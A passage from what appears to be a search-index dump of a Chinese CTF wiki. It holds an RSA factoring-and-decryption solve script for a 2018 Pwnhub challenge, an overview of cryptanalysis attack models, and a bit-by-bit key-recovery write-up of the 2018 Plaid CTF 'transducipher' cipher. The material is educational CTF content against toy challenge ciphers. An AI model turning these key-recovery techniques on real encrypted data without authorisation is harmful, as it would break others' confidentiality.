\uff0c\u5982\u4e0b import gmpy2 tmp = 30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146 print gmpy2 . iroot ( tmp , 2018 ) print gmpy2 . iroot ( tmp - 1 , 2018 ) print gmpy2 . iroot ( tmp - 2 , 2018 ) n = 260272753019642842691231717156206014402348296256668058656902033827190888150939144319270903947159599144884859205368557385941127216969379550487700198771513118894125094678559478972591331182960004648132846372455712958337042783083099376871113795475285658106058675217077803768944674144803250791799957440111855021945690877200606577646234107957498370758707097662736662439460472126493593605957225541979181422479704018055731221681621886820626215670393536343427267329350730257979042198593215747542270975288047196483958369426727778580292311145109908665004662296440533724591193527886702374790526322791818523938910660223971454070731594803459613066617828657725704376475527288174777197739360634209448477565044519733575375490101670974499385760735451471034271880800081246883157088501597655371430353965493264345172541221268942926210055390568364981514774743693528424196241142665685211916330254113610598390909248626686397970038848966187547231199741 y = 191904757378974300059526915134037747982760255307942501070454569331878491189601823952845623286161325306079772871025816081849039036850918375408172174102720702781463514549851887084613000000 L y = gmpy2 . next_prime ( y ) enc = 73933313646416156737449236838459526871566017180178176765840447023088664788672323530940171469589918772272559607026808711216932468486201094786991159096267208480969757088208089800600731106685561375522764783335332964711981392251568543122418192877756299395774738176188452197889668610818741062203831272066261677731889616150485770623945568369493256759711422067551058418926344060504112146971937651406886327429318390247733970549845424064244469193626197360072341969574784310397213033860597822010667926563087858301337091484951760613299203587677078666096526093414014637559237148644939541419075479462431789925219269815364529507771308181435591670281081465439913711912925412078002618729159141400730636976744132429329651487292506365655834202469178066850282850374067239317928012461993443785247524500680257923687511378073703423047348824611101206633407452837948194591695712958510124436821151767823443033286425729473563002691262316964646014201612 end = gmpy2 . iroot ( n / 54 , 6 )[ 0 ] beg = end - 2000000 mid = 1 while beg < end : mid = ( beg + end ) / 2 if gmpy2 . is_prime ( mid ) != 1 : mid = gmpy2 . next_prime ( mid ) p = gmpy2 . next_prime ( 9 * mid ** 3 ) q = gmpy2 . next_prime ( 6 * mid ** 3 ) n1 = p * q if n1 == n : print p , q phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( 0x10001 , phin ) m = gmpy2 . powmod ( enc , d , n ) print hex ( m )[ 2 :] . strip ( 'L' ) . decode ( 'hex' ) print 'ok' exit ( 0 ) elif n1 < n : beg = mid else : end = mid print beg , end","title":"2018 Pwnhub LHY"},{"location":"crypto/attack-summary/attack-mode/","text":"\u7b80\u4ecb \u00b6 \u653b\u51fb\u6a21\u5f0f \u00b6 \u5728\u6211\u4eec\u653b\u51fb\u4e00\u4e2a\u5bc6\u7801\u5b66\u7cfb\u7edf\u65f6\uff0c\u6211\u4eec\u6216\u591a\u6216\u5c11\u4f1a\u5f97\u5230\u5173\u4e8e\u8fd9\u4e2a\u7cfb\u7edf\u7684\u4e00\u4e9b\u4fe1\u606f\u3002\u6839\u636e\u5f97\u5230\u4fe1\u606f\u91cf\u7684\u4e0d\u540c\uff0c\u6211\u4eec\u53ef\u4ee5\u91c7\u7528\u7684\u65b9\u6cd5\u5c31\u53ef\u80fd\u4e0d\u540c\u3002\u5728\u5f53\u4eca\u7684\u5bc6\u7801\u5b66\u5206\u6790\u65f6\uff0c\u4e00\u822c\u6211\u4eec\u90fd\u4f1a\u5047\u8bbe\u653b\u51fb\u8005\u77e5\u9053\u5bc6\u7801\u5b66\u7b97\u6cd5\uff0c\u8fd9\u4e2a\u5047\u8bbe\u662f\u5408\u7406\u7684\uff0c\u56e0\u4e3a\u5386\u53f2\u4e0a\u6709\u5f88\u591a\u4fdd\u5bc6\u7684\u7b97\u6cd5\u6700\u540e\u90fd\u88ab\u4eba\u6240\u77e5\uff0c\u6bd4\u5982 RC4\u3002\u88ab\u77e5\u9053\u7684\u65b9\u5f0f\u591a\u91cd\u591a\u6837\uff0c\u6bd4\u5982\u95f4\u8c0d\uff0c\u9006\u5411\u5de5\u7a0b\u7b49\u3002 \u8fd9\u91cc\u6211\u4eec\u6839\u636e\u653b\u51fb\u8005\u83b7\u53d6\u5bc6\u7801\u5b66\u7cfb\u7edf\u7684\u4fe1\u606f\u7684\u591a\u5c11\u5c06\u653b\u51fb\u6a21\u5f0f\u5206\u4e3a\u4ee5\u4e0b\u51e0\u7c7b \u552f\u5bc6\u6587\u653b\u51fb \uff1a\u653b\u51fb\u8005\u4ec5\u80fd\u83b7\u5f97\u4e00\u4e9b\u52a0\u5bc6\u8fc7\u7684\u5bc6\u6587\u3002 \u5df2\u77e5\u660e\u6587\u653b\u51fb \uff1a\u653b\u51fb\u8005\u6709\u4e00\u4e9b\u5bc6\u6587\u5bf9\u5e94\u7684\u660e\u6587\u3002 \u9009\u62e9\u660e\u6587\u653b\u51fb \uff1a\u653b\u51fb\u8005\u5728\u5f00\u59cb\u653b\u51fb\u65f6\u53ef\u4ee5\u9009\u62e9\u4e00\u4e9b\u660e\u6587\uff0c\u5e76\u83b7\u53d6\u52a0\u5bc6\u540e\u7684\u5bc6\u6587\u3002\u5982\u679c\u653b\u51fb\u8005\u5728\u653b\u51fb\u4e2d\u9014\u53ef\u4ee5\u6839\u636e\u5df2\u7ecf\u83b7\u53d6\u7684\u4fe1\u606f\u9009\u62e9\u65b0\u7684\u660e\u6587\u5e76\u83b7\u53d6\u5bf9\u5e94\u7684\u5bc6\u6587\uff0c\u5219\u79f0\u4e3a\u9002\u5e94\u6027\u9009\u62e9\u660e\u6587\u653b\u51fb\u3002 \u9009\u62e9\u5bc6\u6587\u653b\u51fb \uff1a\u653b\u51fb\u8005\u5728\u5f00\u59cb\u653b\u51fb\u4e4b\u524d\u53ef\u4ee5\u9009\u62e9\u4e00\u4e9b\u5bc6\u6587\uff0c\u5e76\u83b7\u53d6\u89e3\u5bc6\u540e\u7684\u660e\u6587\u3002\u5982\u679c\u653b\u51fb\u8005\u5728\u653b\u51fb\u56fe\u4e2d\u53ef\u4ee5\u6839\u636e\u5df2\u7ecf\u83b7\u53d6\u7684\u4fe1\u606f\u9009\u62e9\u4e00\u4e9b\u65b0\u7684\u5bc6\u6587\u5e76\u83b7\u53d6\u5bf9\u5e94\u7684\u660e\u6587\uff0c\u5219\u79f0\u4e3a\u9002\u5e94\u6027\u9009\u62e9\u5bc6\u6587\u653b\u51fb\u3002 \u76f8\u5173\u5bc6\u94a5\u653b\u51fb \uff1a\u653b\u51fb\u8005\u53ef\u4ee5\u83b7\u5f97\u4e24\u4e2a\u6216\u591a\u4e2a\u76f8\u5173\u5bc6\u94a5\u7684\u52a0\u5bc6\u6216\u89e3\u5bc6\u540e\u7684\u5bc6\u6587\u6216\u660e\u6587\u3002\u4f46\u662f\u653b\u51fb\u8005\u4e0d\u77e5\u9053\u8fd9\u4e9b\u5bc6\u94a5\u3002 \u5e38\u89c1\u653b\u51fb\u65b9\u6cd5 \u00b6 \u6839\u636e\u4e0d\u540c\u7684\u653b\u51fb\u6a21\u5f0f\uff0c\u53ef\u80fd\u4f1a\u6709\u4e0d\u540c\u7684\u653b\u51fb\u65b9\u6cd5\uff0c\u76ee\u524d\u5e38\u89c1\u7684\u653b\u51fb\u65b9\u6cd5\u4e3b\u8981\u6709 \u66b4\u529b\u653b\u51fb \u4e2d\u95f4\u76f8\u9047\u653b\u51fb \u7ebf\u6027\u5206\u6790 \u5dee\u5206\u5206\u6790 \u4e0d\u53ef\u80fd\u5dee\u5206\u5206\u6790 \u79ef\u5206\u5206\u6790 \u4ee3\u6570\u5206\u6790 \u76f8\u5173\u5bc6\u94a5\u653b\u51fb \u4fa7\u4fe1\u9053\u653b\u51fb \u53c2\u8003\u6587\u732e \u00b6 https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90","title":"\u7b80\u4ecb"},{"location":"crypto/attack-summary/attack-mode/#_1","text":"","title":"\u7b80\u4ecb"},{"location":"crypto/attack-summary/attack-mode/#_2","text":"\u5728\u6211\u4eec\u653b\u51fb\u4e00\u4e2a\u5bc6\u7801\u5b66\u7cfb\u7edf\u65f6\uff0c\u6211\u4eec\u6216\u591a\u6216\u5c11\u4f1a\u5f97\u5230\u5173\u4e8e\u8fd9\u4e2a\u7cfb\u7edf\u7684\u4e00\u4e9b\u4fe1\u606f\u3002\u6839\u636e\u5f97\u5230\u4fe1\u606f\u91cf\u7684\u4e0d\u540c\uff0c\u6211\u4eec\u53ef\u4ee5\u91c7\u7528\u7684\u65b9\u6cd5\u5c31\u53ef\u80fd\u4e0d\u540c\u3002\u5728\u5f53\u4eca\u7684\u5bc6\u7801\u5b66\u5206\u6790\u65f6\uff0c\u4e00\u822c\u6211\u4eec\u90fd\u4f1a\u5047\u8bbe\u653b\u51fb\u8005\u77e5\u9053\u5bc6\u7801\u5b66\u7b97\u6cd5\uff0c\u8fd9\u4e2a\u5047\u8bbe\u662f\u5408\u7406\u7684\uff0c\u56e0\u4e3a\u5386\u53f2\u4e0a\u6709\u5f88\u591a\u4fdd\u5bc6\u7684\u7b97\u6cd5\u6700\u540e\u90fd\u88ab\u4eba\u6240\u77e5\uff0c\u6bd4\u5982 RC4\u3002\u88ab\u77e5\u9053\u7684\u65b9\u5f0f\u591a\u91cd\u591a\u6837\uff0c\u6bd4\u5982\u95f4\u8c0d\uff0c\u9006\u5411\u5de5\u7a0b\u7b49\u3002 \u8fd9\u91cc\u6211\u4eec\u6839\u636e\u653b\u51fb\u8005\u83b7\u53d6\u5bc6\u7801\u5b66\u7cfb\u7edf\u7684\u4fe1\u606f\u7684\u591a\u5c11\u5c06\u653b\u51fb\u6a21\u5f0f\u5206\u4e3a\u4ee5\u4e0b\u51e0\u7c7b \u552f\u5bc6\u6587\u653b\u51fb \uff1a\u653b\u51fb\u8005\u4ec5\u80fd\u83b7\u5f97\u4e00\u4e9b\u52a0\u5bc6\u8fc7\u7684\u5bc6\u6587\u3002 \u5df2\u77e5\u660e\u6587\u653b\u51fb \uff1a\u653b\u51fb\u8005\u6709\u4e00\u4e9b\u5bc6\u6587\u5bf9\u5e94\u7684\u660e\u6587\u3002 \u9009\u62e9\u660e\u6587\u653b\u51fb \uff1a\u653b\u51fb\u8005\u5728\u5f00\u59cb\u653b\u51fb\u65f6\u53ef\u4ee5\u9009\u62e9\u4e00\u4e9b\u660e\u6587\uff0c\u5e76\u83b7\u53d6\u52a0\u5bc6\u540e\u7684\u5bc6\u6587\u3002\u5982\u679c\u653b\u51fb\u8005\u5728\u653b\u51fb\u4e2d\u9014\u53ef\u4ee5\u6839\u636e\u5df2\u7ecf\u83b7\u53d6\u7684\u4fe1\u606f\u9009\u62e9\u65b0\u7684\u660e\u6587\u5e76\u83b7\u53d6\u5bf9\u5e94\u7684\u5bc6\u6587\uff0c\u5219\u79f0\u4e3a\u9002\u5e94\u6027\u9009\u62e9\u660e\u6587\u653b\u51fb\u3002 \u9009\u62e9\u5bc6\u6587\u653b\u51fb \uff1a\u653b\u51fb\u8005\u5728\u5f00\u59cb\u653b\u51fb\u4e4b\u524d\u53ef\u4ee5\u9009\u62e9\u4e00\u4e9b\u5bc6\u6587\uff0c\u5e76\u83b7\u53d6\u89e3\u5bc6\u540e\u7684\u660e\u6587\u3002\u5982\u679c\u653b\u51fb\u8005\u5728\u653b\u51fb\u56fe\u4e2d\u53ef\u4ee5\u6839\u636e\u5df2\u7ecf\u83b7\u53d6\u7684\u4fe1\u606f\u9009\u62e9\u4e00\u4e9b\u65b0\u7684\u5bc6\u6587\u5e76\u83b7\u53d6\u5bf9\u5e94\u7684\u660e\u6587\uff0c\u5219\u79f0\u4e3a\u9002\u5e94\u6027\u9009\u62e9\u5bc6\u6587\u653b\u51fb\u3002 \u76f8\u5173\u5bc6\u94a5\u653b\u51fb \uff1a\u653b\u51fb\u8005\u53ef\u4ee5\u83b7\u5f97\u4e24\u4e2a\u6216\u591a\u4e2a\u76f8\u5173\u5bc6\u94a5\u7684\u52a0\u5bc6\u6216\u89e3\u5bc6\u540e\u7684\u5bc6\u6587\u6216\u660e\u6587\u3002\u4f46\u662f\u653b\u51fb\u8005\u4e0d\u77e5\u9053\u8fd9\u4e9b\u5bc6\u94a5\u3002","title":"\u653b\u51fb\u6a21\u5f0f"},{"location":"crypto/attack-summary/attack-mode/#_3","text":"\u6839\u636e\u4e0d\u540c\u7684\u653b\u51fb\u6a21\u5f0f\uff0c\u53ef\u80fd\u4f1a\u6709\u4e0d\u540c\u7684\u653b\u51fb\u65b9\u6cd5\uff0c\u76ee\u524d\u5e38\u89c1\u7684\u653b\u51fb\u65b9\u6cd5\u4e3b\u8981\u6709 \u66b4\u529b\u653b\u51fb \u4e2d\u95f4\u76f8\u9047\u653b\u51fb \u7ebf\u6027\u5206\u6790 \u5dee\u5206\u5206\u6790 \u4e0d\u53ef\u80fd\u5dee\u5206\u5206\u6790 \u79ef\u5206\u5206\u6790 \u4ee3\u6570\u5206\u6790 \u76f8\u5173\u5bc6\u94a5\u653b\u51fb \u4fa7\u4fe1\u9053\u653b\u51fb","title":"\u5e38\u89c1\u653b\u51fb\u65b9\u6cd5"},{"location":"crypto/attack-summary/attack-mode/#_4","text":"https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90","title":"\u53c2\u8003\u6587\u732e"},{"location":"crypto/attack-summary/bit-attack/","text":"\u6bd4\u7279\u653b\u51fb \u00b6 \u6982\u8ff0 \u00b6 \u7b80\u5355\u5730\u8bf4\uff0c\u5c31\u662f\u5229\u7528\u6bd4\u7279\u4f4d\u4e4b\u95f4\u7684\u5173\u7cfb\u8fdb\u884c\u653b\u51fb\u3002 2018 Plaid CTF transducipher \u00b6 \u9898\u76ee\u5982\u4e0b #!/usr/bin/env python3.6 import os BLOCK_SIZE = 64 T = [ (( 2 , 1 ), 1 ), (( 5 , 0 ), 0 ), (( 3 , 4 ), 0 ), (( 1 , 5 ), 1 ), (( 0 , 3 ), 1 ), (( 4 , 2 ), 0 ), ] def block2bin ( b , length = BLOCK_SIZE ): return list ( map ( int , bin ( b )[ 2 :] . rjust ( length , '0' ))) def bin2block ( b ): return int ( \"\" . join ( map ( str , b )), 2 ) def transduce ( b , s = 0 ): if len ( b ) == 0 : return b d , t = T [ s ] b0 , bp = b [ 0 ], b [ 1 :] return [ b0 ^ t ] + transduce ( bp , s = d [ b0 ]) def transduceblock ( b ): return bin2block ( transduce ( block2bin ( b ))) def swap ( b ): l = BLOCK_SIZE // 2 m = ( 1 << l ) - 1 return ( b >> l ) | (( b & m ) << l ) class Transducipher : def __init__ ( self , k ): self . k = [ k ] for i in range ( 1 , len ( T )): k = swap ( transduceblock ( k )) self . k . append ( k ) def encrypt ( self , b ): for i in range ( len ( T )): b ^= self . k [ i ] b = transduceblock ( b ) b = swap ( b ) return b if __name__ == \"__main__\" : flag = bytes . hex ( os . urandom ( BLOCK_SIZE // 8 )) k = int ( flag , 16 ) C = Transducipher ( k ) print ( \"Your flag is PCTF{ %s }\" % flag ) with open ( \"data1.txt\" , \"w\" ) as f : for i in range ( 16 ): pt = int ( bytes . hex ( os . urandom ( BLOCK_SIZE // 8 )), 16 ) ct = C . encrypt ( pt ) f . write ( str (( pt , ct )) + \" \\n \" ) \u9898\u76ee\u7ed9\u4e86 16 \u7ec4\u660e\u5bc6\u6587\u5bf9 \u660e\u6587\u5927\u5c0f 8 \u4e2a\u5b57\u8282 \u5bc6\u6587\u5927\u5c0f 8 \u4e2a\u5b57\u8282 \u5bc6\u94a5\u5927\u5c0f\u4e5f\u662f 8 \u4e2a\u5b57\u8282 \u6211\u4eec\u6240\u9700\u8981\u6c42\u89e3\u7684\u5c31\u662f\u5bc6\u94a5\u3002 \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u4e3b\u8981\u6709\u4e24\u79cd\u57fa\u672c\u64cd\u4f5c swap def swap ( b ): l = BLOCK_SIZE // 2 m = ( 1 << l ) - 1 return ( b >> l ) | (( b & m ) << l ) \u5c06\u7ed9\u5b9a\u7684\u6570\u636e\u7684\u9ad8 32 \u4f4d\u4e0e\u4f4e 32 \u4f4d\u4ea4\u6362\u3002 transduce T = [ (( 2 , 1 ), 1 ), (( 5 , 0 ), 0 ), (( 3 , 4 ), 0 ), (( 1 , 5 ), 1 ), (( 0 , 3 ), 1 ), (( 4 , 2 ), 0 ), ] def transduce ( b , s = 0 ): if len ( b ) == 0 : return b d , t = T [ s ] b0 , bp = b [ 0 ], b [ 1 :] return [ b0 ^ t ] + transduce ( bp , s = d [ b0 ]) \u5176\u4e2d\uff0c b \u662f\u4e00\u4e2a 01 \u6570\u7ec4\uff0c\u521d\u59cb\u65f6\u523b\u5927\u5c0f\u4e3a 64\u3002 s \u662f\u4e00\u4e2a\u4e0b\u6807\u3002 \u57fa\u672c\u6d41\u7a0b\u5982\u4e0b \u6839\u636e s \u9009\u62e9\u4f7f\u7528 T \u7684\u54ea\u4e2a\u5143\u7d20\uff0c\u8fdb\u800c\u5c06\u5176\u5206\u4e3a d \u548c t\u3002 \u5c06 b \u5206\u4e3a\u4e24\u90e8\u5206\uff0c\u4e00\u90e8\u5206\u53ea\u5305\u542b\u5934\u5143\u7d20\uff0c\u53e6\u4e00\u90e8\u5206\u5305\u542b\u5176\u5b83\u7684\u5143\u7d20\u3002 \u5c06\u5934\u5143\u7d20\u4e0e t \u5f02\u6216\u4f5c\u4e3a\u5f53\u524d\u7684\u5934\u5143\u7d20\uff0c\u7136\u540e\u7ee7\u7eed\u8f6c\u6362\u5269\u4e0b\u7684\u90e8\u5206\u3002 \u5176\u5b9e\u6211\u4eec\u53ef\u4ee5\u5c06\u8be5\u51fd\u6570\u8f6c\u6362\u4e3a\u8fed\u4ee3\u51fd\u6570 def transduce_iter ( b , s = 0 ): ans = [] for c in b : d , t = T [ s ] ans += [ c ^ t ] s = d [ c ] return ans \u8fdb\u800c\u7531\u4e8e\u6bcf\u6b21\u5904\u7406\u7684\u662f\u5217\u8868\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\uff0c\u5176\u5b9e\u8be5\u51fd\u6570\u662f\u53ef\u9006\u7684\uff0c\u5982\u4e0b def invtransduce ( b , s = 0 ): if len ( b ) == 0 : return b d , t = T [ s ] b0 , bp = b [ 0 ], b [ 1 :] return [ b0 ^ t ] + transduce ( bp , s = d [ b0 ^ t ]) \u4e0b\u9762\u5206\u6790\u7a0b\u5e8f\u7684\u6838\u5fc3\u6d41\u7a0b\uff0c\u9996\u5148\u662f\u751f\u6210\u5bc6\u94a5\u90e8\u5206\uff0c\u8be5\u52a0\u5bc6\u7b97\u6cd5\u751f\u6210\u4e86 6 \u4e2a\u5bc6\u94a5\uff0c\u6bcf\u6b21\u751f\u6210\u7684\u65b9\u6cd5 transduce \u5148\u524d\u7684\u5bc6\u94a5\u5f97\u5230\u4e2d\u95f4\u503c t \u5bf9 t \u8fdb\u884c swap \u8fde\u7eed\u8fed\u4ee3 5 \u6b21 def __init__ ( self , k ): self . k = [ k ] for i in range ( 1 , len ( T )): k = swap ( transduceblock ( k )) self . k . append ( k ) \u52a0\u5bc6\u7b97\u6cd5\u5982\u4e0b\uff0c\u4e00\u5171\u8fed\u4ee3 6 \u8f6e\uff0c\u57fa\u672c\u6d41\u7a0b \u5f02\u6216\u5bc6\u94a5 transduce \u4ea4\u6362 def encrypt ( self , b ): for i in range ( len ( T )): b ^= self . k [ i ] b = transduceblock ( b ) b = swap ( b ) return b \u901a\u8fc7\u5206\u6790\u7a0b\u5e8f\uff0c\u53ef\u77e5\u8be5\u52a0\u5bc6\u7b97\u6cd5\u662f\u4e00\u4e2a\u5757\u52a0\u5bc6\uff0c\u57fa\u672c\u4fe1\u606f\u5982\u4e0b \u5757\u5927\u5c0f\u4e3a 8 \u4e2a\u5b57\u8282 \u8f6e\u6570\u4e3a 6 \u8f6e \u52a0\u5bc6\u7b97\u6cd5\u7684\u6bcf\u8f6e\u7684\u57fa\u672c\u64cd\u4f5c\u4e3a transduce \u548c swap\u3002 \u5bc6\u94a5\u7684\u6269\u5c55\u4e5f\u662f\u4e0e transduce \u548c swap \u76f8\u5173\u3002 \u66f4\u5177\u4f53\u7684 swap \u662f\u5c06 8 \u5b57\u8282\u7684\u9ad8 32 \u4f4d\u4e0e\u4f4e 32 \u4f4d\u8fdb\u884c\u8c03\u6362\u3002 transduce \u662f\u5bf9\u4e8e 8 \u5b57\u8282\u7684\u6bcf\u4e2a\u6bd4\u7279\uff0c\u9010\u6bd4\u7279\u4e0e\u67d0\u4e2a\u503c\u8fdb\u884c\u5f02\u6216\u3002\u8fd9\u4e2a\u503c\u4e0e T \u6709\u5173\u3002 \u901a\u8fc7\u8fdb\u4e00\u6b65\u5730\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e24\u4e2a\u51fd\u6570\u90fd\u662f\u53ef\u9006\u7684\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86\u6700\u540e\u7684\u5bc6\u6587\uff0c\u90a3\u4e48\u6211\u4eec\u5176\u5b9e\u53ef\u4ee5\u5c06\u539f\u6765\u7684\u8f6e\u6570\u7f29\u77ed\u4e3a\u5dee\u4e0d\u591a 5 \u8f6e\uff0c\u56e0\u4e3a\u6700\u540e\u4e00\u8f6e\u7684 transduce \u548c swap \u6ca1\u6709\u4f5c\u7528\u4e86\u3002 \u6211\u4eec\u53ef\u4ee5\u5b9a\u4e49\u5982\u4e0b\u53d8\u91cf \u540d\u5b57 \u542b\u4e49 k_{i,0} k_{i,0} \u7b2c i \u8f6e\u4f7f\u7528\u7684\u5bc6\u94a5\u7684\u9ad8 32 \u4f4d k_{i,1} k_{i,1} \u7b2c i \u8f6e\u4f7f\u7528\u7684\u5bc6\u94a5\u7684\u4f4e 32 \u4f4d d_{i,0} d_{i,0} \u7b2c i \u8f6e\u4f7f\u7528\u7684\u8f93\u5165\u7684\u9ad8 32 \u4f4d d_{i,1} d_{i,1} \u7b2c i \u8f6e\u4f7f\u7528\u7684\u8f93\u5165\u7684\u4f4e 32 \u4f4d \u7531\u4e8e\u5176\u4e2d\u6709\u4e00\u4e2a\u6838\u5fc3\u64cd\u4f5c\u662f swap\uff0c\u53ea\u4f1a\u64cd\u7eb5\u9ad8\u6216\u4f4e 32 \u4f4d\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5206\u4e3a\u4e24\u90e8\u5206\u8003\u8651\u3002\u7b80\u5316\u5b9a\u4e49\u5982\u4e0b Transduce \u7b80\u5316\u4e3a T\uff0c\u8fd9\u91cc\u867d\u7136\u4e0e\u6e90\u4ee3\u7801\u91cc\u51b2\u7a81\uff0c\u4e0d\u8fc7\u6211\u4eec\u53ef\u4ee5\u6682\u65f6\u7406\u89e3\u4e00\u4e0b\u3002 Swap \u7b80\u5316\u4e3a S\u3002 \u5219\u6bcf\u4e00\u8f6e\u7684\u660e\u5bc6\u6587\uff0c\u5bc6\u94a5\u5982\u4e0b \u8f6e\u6570 \u5de6\u4fa7\u5bc6\u94a5 \u5de6\u4fa7\u5bc6\u6587 \u53f3\u4fa7\u5bc6\u94a5 \u53f3\u4fa7\u5bc6\u6587 0 k_{0,0} k_{0,0} d_{1,0}=T(k_{0,1} \\oplus d_{0,1} ,s) d_{1,0}=T(k_{0,1} \\oplus d_{0,1} ,s) k_{0,1} k_{0,1} d_{1,1}=T(k_{0,0} \\oplus d_{0,0}) d_{1,1}=T(k_{0,0} \\oplus d_{0,0}) 1 k_{1,0}=T(k_{0,1},s) k_{1,0}=T(k_{0,1},s) d_{2,0}=T(k_{1,1} \\oplus d_{1,1} ,s) d_{2,0}=T(k_{1,1} \\oplus d_{1,1} ,s) k_{1,1}=T(k_{0,0}) k_{1,1}=T(k_{0,0}) d_{2,1}=T(k_{1,0} \\oplus d_{1,0}) d_{2,1}=T(k_{1,0} \\oplus d_{1,0}) 2 k_{2,0}=T(k_{1,1},s) k_{2,0}=T(k_{1,1},s) d_{3,0}=T(k_{2,1} \\oplus d_{2,1} ,s) d_{3,0}=T(k_{2,1} \\oplus d_{2,1} ,s) k_{2,1}=T(k_{1,0}) k_{2,1}=T(k_{1,0}) d_{3,1}=T(k_{2,0} \\oplus d_{2,0}) d_{3,1}=T(k_{2,0} \\oplus d_{2,0}) 3 k_{3,0}=T(k_{2,1},s) k_{3,0}=T(k_{2,1},s) d_{4,0}=T(k_{3,1} \\oplus d_{3,1} ,s) d_{4,0}=T(k_{3,1} \\oplus d_{3,1} ,s) k_{3,1}=T(k_{2,0}) k_{3,1}=T(k_{2,0}) d_{4,1}=T(k_{3,0} \\oplus d_{3,0}) d_{4,1}=T(k_{3,0} \\oplus d_{3,0}) 4 k_{4,0}=T(k_{3,1},s) k_{4,0}=T(k_{3,1},s) d_{5,0}=T(k_{4,1} \\oplus d_{4,1} ,s) d_{5,0}=T(k_{4,1} \\oplus d_{4,1} ,s) k_{4,1}=T(k_{3,0}) k_{4,1}=T(k_{3,0}) d_{5,1}=T(k_{4,0} \\oplus d_{4,0}) d_{5,1}=T(k_{4,0} \\oplus d_{4,0}) 5 k_{5,0}=T(k_{4,1},s) k_{5,0}=T(k_{4,1},s) d_{6,0}=T(k_{5,1} \\oplus d_{5,1} ,s) d_{6,0}=T(k_{5,1} \\oplus d_{5,1} ,s) k_{5,1}=T(k_{4,0}) k_{5,1}=T(k_{4,0}) d_{6,1}=T(k_{5,0} \\oplus d_{5,0}) d_{6,1}=T(k_{5,0} \\oplus d_{5,0}) \u90a3\u4e48\uff0c\u6211\u4eec\u53ef\u4ee5\u9010\u6bd4\u7279\u4f4d\u679a\u4e3e k \u7684\u9ad8 32 \u4f4d\uff0c\u540c\u65f6\u679a\u4e3e\u5728\u8fdb\u884c T \u64cd\u4f5c\u65f6\u7684\u53ef\u80fd\u7684 s \u72b6\u6001\u4f4d\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u83b7\u53d6\u9ad8 32 \u4f4d\u5bc6\u94a5\u3002\u5728\u8fdb\u884c\u9010\u4f4d\u7206\u7834\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u4ece\u83b7\u53d6\u4e24\u4e2a\u53ef\u80fd\u7ed3\u679c [2659900894, 2659900895] \u518d\u6839\u636e\u5de6\u8fb9\u7684\u7ed3\u679c\uff0c\u53ef\u4ee5\u53bb\u83b7\u53d6\u53f3\u8fb9\u53ef\u80fd\u7684\u7ed3\u679c\uff0c\u5229\u7528 2659900894 \u83b7\u53d6\u7684\u53ef\u80fd\u7684\u7ed3\u679c\u5982\u4e0b # \u7b2c\u4e00\u7ec4\u660e\u5bc6\u6587\u5bf9\u5bf9\u5e94\u7684\u5bc6\u94a5\u53ef\u80fd\u592a\u591a\u3002 # \u7b2c\u4e8c\u7ec4\u4e00\u5171 6 \u4e2a\u3002 [2764038144, 2764038145, 2764038152, 2764038153, 2764038154, 2764038155] # \u7b2c\u4e09\u7ec4 [2764038144, 2764038145] \u7136\u540e\u5176\u5b9e\u6211\u4eec\u5c31\u53ef\u4ee5\u624b\u5de5\u8bd5\u4e00\u4e0b\u52a0\u5bc6\u6240\u6709\u7684\u660e\u5bc6\u6587\uff0c\u5982\u679c\u4e0d\u5bf9\uff0c\u5c31\u76f4\u63a5\u5224\u65ad\u9519\u8bef\u5373\u53ef\u4e86\u3002\u8fd9\u6837\u5176\u5b9e\u53ef\u4ee5\u5f88\u5feb\u53ef\u4ee5\u8fc7\u6ee4\u3002\u6700\u540e\u53ef\u4ee5\u53d1\u73b0\u5bc6\u94a5\u662f 2659900894|2764038145 \u4e5f\u5c31\u662f11424187353095200769\u3002\u4e5f\u5c31\u62ff\u5230\u4e86 flag\u3002 \u5f53\u7136\uff0c\u672c\u9898\u76ee\u4e5f\u53ef\u4ee5\u4f7f\u7528\u4e2d\u95f4\u76f8\u9047\u7684\u653b\u51fb\u65b9\u6cd5\uff0c\u4e5f\u5c31\u662f\u8bf4\u5206\u522b\u679a\u4e3e\u7b2c 0 \u8f6e\u4f7f\u7528\u7684\u5bc6\u94a5\u548c\u6700\u540e\u4e00\u8f6e\u4f7f\u7528\u7684\u5bc6\u94a5\u4f7f\u5176\u5728\u7b2c\u4e09\u8f6e\u76f8\u9047\u4ea7\u751f\u78b0\u649e\u3002 \u53c2\u8003 \u00b6 http://blog.rb-tree.xyz/2018/05/07/plaidctf-2018-transducipher/","title":"\u6bd4\u7279\u653b\u51fb"},{"location":"crypto/attack-summary/bit-attack/#_1","text":"","title":"\u6bd4\u7279\u653b\u51fb"},{"location":"crypto/attack-summary/bit-attack/#_2","text":"\u7b80\u5355\u5730\u8bf4\uff0c\u5c31\u662f\u5229\u7528\u6bd4\u7279\u4f4d\u4e4b\u95f4\u7684\u5173\u7cfb\u8fdb\u884c\u653b\u51fb\u3002","title":"\u6982\u8ff0"},{"location":"crypto/attack-summary/bit-attack/#2018-plaid-ctf-transducipher","text":"\u9898\u76ee\u5982\u4e0b #!/usr/bin/env python3.6 import os BLOCK_SIZE = 64 T = [ (( 2 , 1 ), 1 ), (( 5 , 0 ), 0 ), (( 3 , 4 ), 0 ), (( 1 , 5 ), 1 ), (( 0 , 3 ), 1 ), (( 4 , 2 ), 0 ), ] def block2bin ( b , length = BLOCK_SIZE ): return list ( map ( int , bin ( b )[ 2 :] . rjust ( length , '0' ))) def bin2block ( b ): return int ( \"\" . join ( map ( str , b )), 2 ) def transduce ( b , s = 0 ): if len ( b ) == 0 : return b d , t = T [ s ] b0 , 